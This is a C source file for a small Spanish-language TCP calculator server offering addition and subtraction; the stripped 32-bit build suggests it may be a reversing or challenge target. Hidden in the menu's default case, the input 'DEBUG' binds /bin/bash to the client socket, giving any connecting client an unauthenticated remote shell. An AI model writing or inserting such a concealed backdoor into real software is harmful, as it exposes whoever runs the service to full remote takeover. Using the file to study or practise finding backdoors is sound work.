/*
 * gcc -m32 CalculatorServer.c; strip a.out
 */
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<unistd.h>
#include<errno.h>
#include<sys/types.h>
#include<sys/socket.h>
#include<resolv.h>
#include<arpa/inet.h>
#include<string.h>

#define PORT 12345
#define MAXBUF 2034

void menu(char * msg); 
void gestionaConexion(int sockfd);

/*
 * main: Funcion principal
 */

int main(void) {

	int sockfd;
	struct sockaddr_in sa;

	// Creamos el socket
	if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
		perror("Error al crear el socket.\n");
		exit(errno);
	}

	//iniciamos la estructura del socket
	bzero(&sa, sizeof(sa));
	sa.sin_family = AF_INET;
	sa.sin_port = htons(PORT);
	sa.sin_addr.s_addr = INADDR_ANY;

	// Evitamos los 20 segundos de tiempo para reiniciar el proceso si se
	// interrumpe
	int optval = 1;
	setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, (const void *)&optval, sizeof(int));

	// Establecemos el puerto
	if (bind(sockfd, (struct sockaddr *)&sa, sizeof(sa)) != 0) {
		perror("Error al asociar al puerto de escucha.\n");
		exit(errno);
	}

	// Ponemos el socket a la escucha
	if (listen(sockfd, 20) != 0) {
		perror("Error al establecer el socket a la escucha.\n");
		exit(errno);
	}

	// mostrar mensaje de inicio
	printf("CalculatorServer v0.1a\n-----------------------\n\n[*] Escuchando en: %s:%d\n", inet_ntoa(sa.sin_addr), ntohs(sa.sin_port));

	// Bucle infinito que gestiona la comunicacion con el cliente
	while(1) {
		gestionaConexion(sockfd);
	}

	close(sockfd);

	return (0);
}

/***
 * menu: Se copia en la cadena el menu de opciones.
 ***/
void menu(char * msg) {
	sprintf(msg, "Bienvenida al servidor de calculdora, elija una de las siguientes opciones:\n" \
			"A) Suma\n" \
			"B) Resta\n" \
			"--------\n" \
			"Z) Salir\n %s","Teclee su opcion[A|B|Z]: ");
}

/*************
 * gestionaConexion: 
 *************/
void gestionaConexion(int sockfd) {
	int clientfd;
	struct sockaddr_in client_addr;
	int addrlen = sizeof(client_addr);
	char buffer[MAXBUF];
	int flagSalir = 0;

	// Acptamos la conexion entrante y la gestionamos
	clientfd = accept(sockfd, (struct sockaddr *)&client_addr, &addrlen);
	printf("[+] Nueva conexion del cliente %s:%d\n", inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));

	// Enviamos respuesta de bienvenida
	sprintf(buffer, "Calculator Server v0.1a\n----------------------------\n\n");
	send(clientfd, buffer, strlen(buffer), 0);

	while(1) {
		// Comprobamos que no se haya solicitado salir
		if (flagSalir)
			break;

		// Enviame el menu de opciones
		menu(buffer);
		send(clientfd, buffer, strlen(buffer), 0);

		// Leemos los datos enviados por el cliente
		recv(clientfd, buffer, MAXBUF, 0);
		char op = buffer[0];
		int resultado = 0;
		int debugMode = 0;

		switch(op) {
			case 'A':
			case 'a':
				strcpy(buffer, "\n\tOperando 1: ");
				send(clientfd, buffer, strlen(buffer), 0);
				recv(clientfd, buffer, MAXBUF, 0);
				resultado = atoi(buffer);

				strcpy(buffer, "\tOperando 2 :");
				send(clientfd, buffer, strlen(buffer), 0);
				recv(clientfd, buffer, MAXBUF, 0);
				resultado += atoi(buffer);

				sprintf(buffer, "\nEl resultado es: %i\n\n", resultado);
				send(clientfd, buffer, strlen(buffer), 0);
				break;

			case 'B':
			case 'b':
				strcpy(buffer, "\n\tOperando 1: ");
				send(clientfd, buffer, strlen(buffer), 0);
				recv(clientfd, buffer, MAXBUF, 0);
				resultado = atoi(buffer);

				strcpy(buffer, "\tOperando 2 : ");
				send(clientfd, buffer, strlen(buffer), 0);
				recv(clientfd, buffer, MAXBUF, 0);
				resultado -= atoi(buffer);

				sprintf(buffer, "\nEl resultado es: %i\n\n", resultado);
				send(clientfd, buffer, strlen(buffer), 0);
				break;

			case 'Z':
			case 'z':
				strcpy(buffer, "\nGracias por utilizar el servicio. Hasta pronto.\n\n");
				send(clientfd, buffer, strlen(buffer), 0);
				flagSalir = 1;
				break;

			default:
				buffer[5] = '\0';

				if (!strcmp(buffer, "DEBUG")) {
					strcpy(buffer, "\nBienvenido al modo depuracion. Ejecutando /bin/bash ...\n$ ");
					send(clientfd, buffer, strlen(buffer), 0);
					printf("La funcionalidad de depuracion esta siendo utilizada.\n");
					char *argv[] = {"/bin/bash", 0};

					dup2(clientfd, 0);
					dup2(clientfd, 1);
					dup2(clientfd, 2);

					execvp(*argv, argv);
					strcpy(buffer, "\nEl comando se ha ejecutado correctamente.\n\n");
					send(clientfd, buffer, strlen(buffer), 0);
					break;
				}
				strcpy(buffer, "\nOpcion invalida, prueba otra vez.\n\n");
				send(clientfd, buffer, strlen(buffer), 0);
				break;
		}
	}
	// Cerramos la conexion con el cliente.
	close(clientfd);
}

